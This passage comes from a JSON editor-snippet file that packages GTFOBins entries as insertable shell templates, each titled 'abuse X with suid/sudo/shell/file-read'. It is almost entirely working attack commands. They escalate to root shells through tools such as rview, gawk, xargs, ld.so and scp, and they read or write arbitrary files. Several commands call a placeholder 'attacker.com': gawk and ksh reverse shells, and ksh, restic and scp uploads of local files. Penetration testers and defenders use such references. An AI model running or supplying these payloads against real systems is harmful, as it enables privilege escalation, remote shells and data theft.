            "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse rview with suid - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview sudo (gtfobins)": {
        "prefix": "rview sudo",
        "body": [
            "abuse rview with sudo, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "sudo rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with sudo - This requires that `rview` is compiled with Lua support."
    },
    "rview capabilities (gtfobins)": {
        "prefix": "rview capabilities",
        "body": [
            "abuse rview with capabilities, This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rview -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with capabilities - This requires that `rview` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rview limited-suid (gtfobins)": {
        "prefix": "rview limited-suid",
        "body": [
            "abuse rview with limited-suid, This requires that `rview` is compiled with Lua support.",
            "",
            "```sh",
            "./rview -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rview with limited-suid - This requires that `rview` is compiled with Lua support."
    },
    "tcpdump command (gtfobins)": {
        "prefix": "tcpdump command",
        "body": [
            "abuse tcpdump with command",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \\$TF${0}",
            "```"
        ],
        "description": "abuse tcpdump with command"
    },
    "tcpdump sudo (gtfobins)": {
        "prefix": "tcpdump sudo",
        "body": [
            "abuse tcpdump with sudo",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z \\$TF -Z root${0}",
            "```"
        ],
        "description": "abuse tcpdump with sudo"
    },
    "alpine file-read (gtfobins)": {
        "prefix": "alpine file-read",
        "body": [
            "abuse alpine with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with file-read"
    },
    "alpine suid (gtfobins)": {
        "prefix": "alpine suid",
        "body": [
            "abuse alpine with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with suid"
    },
    "alpine sudo (gtfobins)": {
        "prefix": "alpine sudo",
        "body": [
            "abuse alpine with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo alpine -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse alpine with sudo"
    },
    "file file-read (gtfobins)": {
        "prefix": "file file-read",
        "body": [
            "abuse file with file-read, \nEach line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\n\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\n\n\nIt can also be provided with a directory and will read each file in the directory.\n",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "file -m \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with file-read - \nEach line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\n\n\nIf a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.\n\n\n\nIt can also be provided with a directory and will read each file in the directory.\n"
    },
    "file suid (gtfobins)": {
        "prefix": "file suid",
        "body": [
            "abuse file with suid, Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./file -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with suid - Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
    },
    "file sudo (gtfobins)": {
        "prefix": "file sudo",
        "body": [
            "abuse file with sudo, Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo file -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse file with sudo - Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
    },
    "dig file-read (gtfobins)": {
        "prefix": "dig file-read",
        "body": [
            "abuse dig with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with file-read"
    },
    "dig sudo (gtfobins)": {
        "prefix": "dig sudo",
        "body": [
            "abuse dig with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with sudo"
    },
    "dig suid (gtfobins)": {
        "prefix": "dig suid",
        "body": [
            "abuse dig with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./dig -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse dig with suid"
    },
    "pdftex shell (gtfobins)": {
        "prefix": "pdftex shell",
        "body": [
            "abuse pdftex with shell",
            "",
            "```sh",
            "pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with shell"
    },
    "pdftex sudo (gtfobins)": {
        "prefix": "pdftex sudo",
        "body": [
            "abuse pdftex with sudo",
            "",
            "```sh",
            "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with sudo"
    },
    "pdftex limited-suid (gtfobins)": {
        "prefix": "pdftex limited-suid",
        "body": [
            "abuse pdftex with limited-suid",
            "",
            "```sh",
            "./pdftex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse pdftex with limited-suid"
    },
    "xetex shell (gtfobins)": {
        "prefix": "xetex shell",
        "body": [
            "abuse xetex with shell",
            "",
            "```sh",
            "xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with shell"
    },
    "xetex sudo (gtfobins)": {
        "prefix": "xetex sudo",
        "body": [
            "abuse xetex with sudo",
            "",
            "```sh",
            "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with sudo"
    },
    "xetex limited-suid (gtfobins)": {
        "prefix": "xetex limited-suid",
        "body": [
            "abuse xetex with limited-suid",
            "",
            "```sh",
            "./xetex --shell-escape '\\write18{/bin/sh}\\end'${0}",
            "```"
        ],
        "description": "abuse xetex with limited-suid"
    },
    "gawk shell (gtfobins)": {
        "prefix": "gawk shell",
        "body": [
            "abuse gawk with shell",
            "",
            "```sh",
            "gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with shell"
    },
    "gawk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "gawk non-interactive-reverse-shell",
        "body": [
            "abuse gawk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "gawk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse gawk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "gawk non-interactive-bind-shell (gtfobins)": {
        "prefix": "gawk non-interactive-bind-shell",
        "body": [
            "abuse gawk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "gawk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse gawk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "gawk file-write (gtfobins)": {
        "prefix": "gawk file-write",
        "body": [
            "abuse gawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse gawk with file-write"
    },
    "gawk file-read (gtfobins)": {
        "prefix": "gawk file-read",
        "body": [
            "abuse gawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gawk with file-read"
    },
    "gawk suid (gtfobins)": {
        "prefix": "gawk suid",
        "body": [
            "abuse gawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./gawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gawk with suid"
    },
    "gawk sudo (gtfobins)": {
        "prefix": "gawk sudo",
        "body": [
            "abuse gawk with sudo",
            "",
            "```sh",
            "sudo gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with sudo"
    },
    "gawk limited-suid (gtfobins)": {
        "prefix": "gawk limited-suid",
        "body": [
            "abuse gawk with limited-suid",
            "",
            "```sh",
            "./gawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse gawk with limited-suid"
    },
    "xargs shell (gtfobins)": {
        "prefix": "xargs shell",
        "body": [
            "abuse xargs with shell, Read interactively from `stdin`.",
            "",
            "```sh",
            "xargs -Ix sh -c 'exec sh 0<&1'",
            "x^D^D${0}",
            "```"
        ],
        "description": "abuse xargs with shell - Read interactively from `stdin`."
    },
    "xargs file-read (gtfobins)": {
        "prefix": "xargs file-read",
        "body": [
            "abuse xargs with file-read, This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xargs -a \"\\$LFILE\" -0${0}",
            "```"
        ],
        "description": "abuse xargs with file-read - This works as long as the file does not contain the NUL character, also a trailing `$'\\n'` is added. The actual `/bin/echo` command is executed. GNU version only."
    },
    "xargs suid (gtfobins)": {
        "prefix": "xargs suid",
        "body": [
            "abuse xargs with suid, GNU version only.",
            "",
            "```sh",
            "./xargs -a /dev/null sh -p${0}",
            "```"
        ],
        "description": "abuse xargs with suid - GNU version only."
    },
    "xargs sudo (gtfobins)": {
        "prefix": "xargs sudo",
        "body": [
            "abuse xargs with sudo, GNU version only.",
            "",
            "```sh",
            "sudo xargs -a /dev/null sh${0}",
            "```"
        ],
        "description": "abuse xargs with sudo - GNU version only."
    },
    "expand file-read (gtfobins)": {
        "prefix": "expand file-read",
        "body": [
            "abuse expand with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with file-read"
    },
    "expand suid (gtfobins)": {
        "prefix": "expand suid",
        "body": [
            "abuse expand with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with suid"
    },
    "expand sudo (gtfobins)": {
        "prefix": "expand sudo",
        "body": [
            "abuse expand with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo expand \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse expand with sudo"
    },
    "nsenter shell (gtfobins)": {
        "prefix": "nsenter shell",
        "body": [
            "abuse nsenter with shell",
            "",
            "```sh",
            "nsenter /bin/sh${0}",
            "```"
        ],
        "description": "abuse nsenter with shell"
    },
    "nsenter sudo (gtfobins)": {
        "prefix": "nsenter sudo",
        "body": [
            "abuse nsenter with sudo",
            "",
            "```sh",
            "sudo nsenter /bin/sh${0}",
            "```"
        ],
        "description": "abuse nsenter with sudo"
    },
    "strings file-read (gtfobins)": {
        "prefix": "strings file-read",
        "body": [
            "abuse strings with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with file-read"
    },
    "strings suid (gtfobins)": {
        "prefix": "strings suid",
        "body": [
            "abuse strings with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with suid"
    },
    "strings sudo (gtfobins)": {
        "prefix": "strings sudo",
        "body": [
            "abuse strings with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo strings \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse strings with sudo"
    },
    "restic file-upload (gtfobins)": {
        "prefix": "restic file-upload",
        "body": [
            "abuse restic with file-upload",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with file-upload"
    },
    "restic sudo (gtfobins)": {
        "prefix": "restic sudo",
        "body": [
            "abuse restic with sudo",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "sudo restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with sudo"
    },
    "restic suid (gtfobins)": {
        "prefix": "restic suid",
        "body": [
            "abuse restic with suid",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "LFILE=file_or_dir_to_get",
            "NAME=backup_name",
            "./restic backup -r \"rest:http://\\$RHOST:\\$RPORT/\\$NAME\" \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse restic with suid"
    },
    "setfacl suid (gtfobins)": {
        "prefix": "setfacl suid",
        "body": [
            "abuse setfacl with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "USER=somebody",
            "./setfacl -m u:\\$USER:rwx \\$LFILE${0}",
            "```"
        ],
        "description": "abuse setfacl with suid"
    },
    "setfacl sudo (gtfobins)": {
        "prefix": "setfacl sudo",
        "body": [
            "abuse setfacl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "USER=somebody",
            "sudo setfacl -m -u:\\$USER:rwx \\$LFILE${0}",
            "```"
        ],
        "description": "abuse setfacl with sudo"
    },
    "xxd file-write (gtfobins)": {
        "prefix": "xxd file-write",
        "body": [
            "abuse xxd with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | xxd | xxd -r - \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xxd with file-write"
    },
    "xxd file-read (gtfobins)": {
        "prefix": "xxd file-read",
        "body": [
            "abuse xxd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with file-read"
    },
    "xxd suid (gtfobins)": {
        "prefix": "xxd suid",
        "body": [
            "abuse xxd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with suid"
    },
    "xxd sudo (gtfobins)": {
        "prefix": "xxd sudo",
        "body": [
            "abuse xxd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xxd \"\\$LFILE\" | xxd -r${0}",
            "```"
        ],
        "description": "abuse xxd with sudo"
    },
    "cowthink shell (gtfobins)": {
        "prefix": "cowthink shell",
        "body": [
            "abuse cowthink with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "cowthink -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowthink with shell"
    },
    "cowthink sudo (gtfobins)": {
        "prefix": "cowthink sudo",
        "body": [
            "abuse cowthink with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec \"/bin/sh\";' >\\$TF",
            "sudo cowthink -f \\$TF x${0}",
            "```"
        ],
        "description": "abuse cowthink with sudo"
    },
    "efax suid (gtfobins)": {
        "prefix": "efax suid",
        "body": [
            "abuse efax with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./efax -d \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse efax with suid"
    },
    "efax sudo (gtfobins)": {
        "prefix": "efax sudo",
        "body": [
            "abuse efax with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo efax -d \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse efax with sudo"
    },
    "eqn file-read (gtfobins)": {
        "prefix": "eqn file-read",
        "body": [
            "abuse eqn with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with file-read"
    },
    "eqn suid (gtfobins)": {
        "prefix": "eqn suid",
        "body": [
            "abuse eqn with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with suid"
    },
    "eqn sudo (gtfobins)": {
        "prefix": "eqn sudo",
        "body": [
            "abuse eqn with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo eqn \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse eqn with sudo"
    },
    "tasksh shell (gtfobins)": {
        "prefix": "tasksh shell",
        "body": [
            "abuse tasksh with shell",
            "",
            "```sh",
            "tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with shell"
    },
    "tasksh limited-suid (gtfobins)": {
        "prefix": "tasksh limited-suid",
        "body": [
            "abuse tasksh with limited-suid",
            "",
            "```sh",
            "./tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with limited-suid"
    },
    "tasksh sudo (gtfobins)": {
        "prefix": "tasksh sudo",
        "body": [
            "abuse tasksh with sudo",
            "",
            "```sh",
            "sudo tasksh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse tasksh with sudo"
    },
    "byebug shell (gtfobins)": {
        "prefix": "byebug shell",
        "body": [
            "abuse byebug with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with shell"
    },
    "byebug limited-suid (gtfobins)": {
        "prefix": "byebug limited-suid",
        "body": [
            "abuse byebug with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "./byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with limited-suid"
    },
    "byebug sudo (gtfobins)": {
        "prefix": "byebug sudo",
        "body": [
            "abuse byebug with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'system(\"/bin/sh\")' > \\$TF",
            "sudo byebug \\$TF",
            "continue${0}",
            "```"
        ],
        "description": "abuse byebug with sudo"
    },
    "fish shell (gtfobins)": {
        "prefix": "fish shell",
        "body": [
            "abuse fish with shell",
            "",
            "```sh",
            "fish${0}",
            "```"
        ],
        "description": "abuse fish with shell"
    },
    "fish suid (gtfobins)": {
        "prefix": "fish suid",
        "body": [
            "abuse fish with suid",
            "",
            "```sh",
            "./fish${0}",
            "```"
        ],
        "description": "abuse fish with suid"
    },
    "fish sudo (gtfobins)": {
        "prefix": "fish sudo",
        "body": [
            "abuse fish with sudo",
            "",
            "```sh",
            "sudo fish${0}",
            "```"
        ],
        "description": "abuse fish with sudo"
    },
    "ksh shell (gtfobins)": {
        "prefix": "ksh shell",
        "body": [
            "abuse ksh with shell",
            "",
            "```sh",
            "ksh${0}",
            "```"
        ],
        "description": "abuse ksh with shell"
    },
    "ksh reverse-shell (gtfobins)": {
        "prefix": "ksh reverse-shell",
        "body": [
            "abuse ksh with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "ksh -c 'ksh -i > /dev/tcp/\\$RHOST/\\$RPORT 2>&1 0>&1'${0}",
            "```"
        ],
        "description": "abuse ksh with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "ksh file-upload (gtfobins)": {
        "prefix": "ksh file-upload",
        "body": [
            "abuse ksh with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "ksh -c 'cat \\$LFILE > /dev/tcp/\\$RHOST/\\$RPORT'${0}",
            "```"
        ],
        "description": "abuse ksh with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "ksh file-download (gtfobins)": {
        "prefix": "ksh file-download",
        "body": [
            "abuse ksh with file-download, Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "export LFILE=file_to_get",
            "ksh -c 'cat < /dev/tcp/\\$RHOST/\\$RPORT > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ksh with file-download - Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "ksh file-write (gtfobins)": {
        "prefix": "ksh file-write",
        "body": [
            "abuse ksh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ksh -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ksh with file-write"
    },
    "ksh file-read (gtfobins)": {
        "prefix": "ksh file-read",
        "body": [
            "abuse ksh with file-read, It trims trailing newlines.",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "ksh -c \\$'read -r -d \\x04 < \"\\$LFILE\"; echo \"\\$REPLY\"'${0}",
            "```"
        ],
        "description": "abuse ksh with file-read - It trims trailing newlines."
    },
    "ksh suid (gtfobins)": {
        "prefix": "ksh suid",
        "body": [
            "abuse ksh with suid",
            "",
            "```sh",
            "./ksh -p${0}",
            "```"
        ],
        "description": "abuse ksh with suid"
    },
    "ksh sudo (gtfobins)": {
        "prefix": "ksh sudo",
        "body": [
            "abuse ksh with sudo",
            "",
            "```sh",
            "sudo ksh${0}",
            "```"
        ],
        "description": "abuse ksh with sudo"
    },
    "scp shell (gtfobins)": {
        "prefix": "scp shell",
        "body": [
            "abuse scp with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "scp -S \\$TF x y:${0}",
            "```"
        ],
        "description": "abuse scp with shell"
    },
    "scp file-upload (gtfobins)": {
        "prefix": "scp file-upload",
        "body": [
            "abuse scp with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "RPATH=user@${3:attacker.com}:~/${2:file_to_save}",
            "LPATH=${1:file_to_send}",
            "scp \\$LFILE \\$RPATH${0}",
            "```"
        ],
        "description": "abuse scp with file-upload - Send local file to a SSH server."
    },
    "scp file-download (gtfobins)": {
        "prefix": "scp file-download",
        "body": [
            "abuse scp with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "RPATH=user@${2:attacker.com}:~/file_to_get",
            "LFILE=${1:file_to_save}",
            "scp \\$RPATH \\$LFILE${0}",
            "```"
        ],
        "description": "abuse scp with file-download - Fetch a remote file from a SSH server."
    },
    "scp sudo (gtfobins)": {
        "prefix": "scp sudo",
        "body": [
            "abuse scp with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "sudo scp -S \\$TF x y:${0}",
            "```"
        ],
        "description": "abuse scp with sudo"
    },
    "scp limited-suid (gtfobins)": {
        "prefix": "scp limited-suid",
        "body": [
            "abuse scp with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'sh 0<&2 1>&2' > \\$TF",
            "chmod +x \"\\$TF\"",
            "./scp -S \\$TF a b:${0}",
            "```"
        ],
        "description": "abuse scp with limited-suid"
    },
    "ld.so shell (gtfobins)": {
        "prefix": "ld.so shell",
        "body": [
            "abuse ld.so with shell",
            "",
            "```sh",
            "/lib/ld.so /bin/sh${0}",
            "```"
        ],
        "description": "abuse ld.so with shell"
    },
    "ld.so suid (gtfobins)": {
        "prefix": "ld.so suid",
        "body": [
            "abuse ld.so with suid",
            "",
            "```sh",
            "./ld.so /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ld.so with suid"
    },
    "ld.so sudo (gtfobins)": {
        "prefix": "ld.so sudo",
        "body": [
            "abuse ld.so with sudo",
            "",
            "```sh",
            "sudo /lib/ld.so /bin/sh${0}",
            "```"
        ],
        "description": "abuse ld.so with sudo"
    },
    "dotnet shell (gtfobins)": {
        "prefix": "dotnet shell",
        "body": [
            "abuse dotnet with shell",
            "",
            "```sh",
            "dotnet fsi",
            "System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;${0}",
            "```"
        ],
        "description": "abuse dotnet with shell"
    },
    "dotnet file-read (gtfobins)": {
        "prefix": "dotnet file-read",
        "body": [
            "abuse dotnet with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "dotnet fsi",
            "System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(\"LFILE\"));;${0}",
            "```"
        ],
        "description": "abuse dotnet with file-read"
    },
    "dotnet sudo (gtfobins)": {
        "prefix": "dotnet sudo",
        "body": [
            "abuse dotnet with sudo",
            "",
            "```sh",
            "sudo dotnet fsi",
            "System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;${0}",
            "```"
        ],
        "description": "abuse dotnet with sudo"
    },
    "atobm file-read (gtfobins)": {
        "prefix": "atobm file-read",
        "body": [
            "abuse atobm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with file-read"
    },
    "atobm sudo (gtfobins)": {
        "prefix": "atobm sudo",
        "body": [
            "abuse atobm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with sudo"
    },
    "atobm suid (gtfobins)": {
        "prefix": "atobm suid",
        "body": [
            "abuse atobm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./atobm \\$LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", \\$2}'${0}",
            "```"
        ],
        "description": "abuse atobm with suid"
    },
    "volatility shell (gtfobins)": {
        "prefix": "volatility shell",
        "body": [
            "abuse volatility with shell",
            "",
            "```sh",
            "volatility -f file.dump volshell",
            "__import__('os').system('/bin/sh')${0}",
            "```"
        ],
        "description": "abuse volatility with shell"
    },
    "check_raid file-read (gtfobins)": {
        "prefix": "check_raid file-read",
        "body": [
            "abuse check_raid with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_raid --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_raid with file-read"
    },
    "check_raid sudo (gtfobins)": {
        "prefix": "check_raid sudo",
        "body": [
            "abuse check_raid with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_raid --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_raid with sudo"
    },
    "octave shell (gtfobins)": {
        "prefix": "octave shell",
        "body": [
            "abuse octave with shell",
            "",
            "```sh",
            "octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse octave with shell"
    },
    "octave file-write (gtfobins)": {
        "prefix": "octave file-write",
        "body": [
            "abuse octave with file-write",
            "",
            "```sh",
            "octave-cli --eval 'filename = \"${1:file_to_write}\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'${0}",
            "```"
        ],
        "description": "abuse octave with file-write"
    },
    "octave file-read (gtfobins)": {
        "prefix": "octave file-read",
        "body": [
            "abuse octave with file-read",
            "",
            "```sh",
            "octave-cli --eval 'format none; fid = fopen(\"${1:file_to_read}\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'${0}",
            "```"
        ],
        "description": "abuse octave with file-read"
    },
    "octave sudo (gtfobins)": {
        "prefix": "octave sudo",
        "body": [
            "abuse octave with sudo",
            "",
            "```sh",
            "sudo octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse octave with sudo"
    },
    "octave limited-suid (gtfobins)": {
        "prefix": "octave limited-suid",
        "body": [
            "abuse octave with limited-suid",
            "",
            "```sh",
            "./octave-cli --eval 'system(\"/bin/sh\")'${0}",
            "```"
        ],
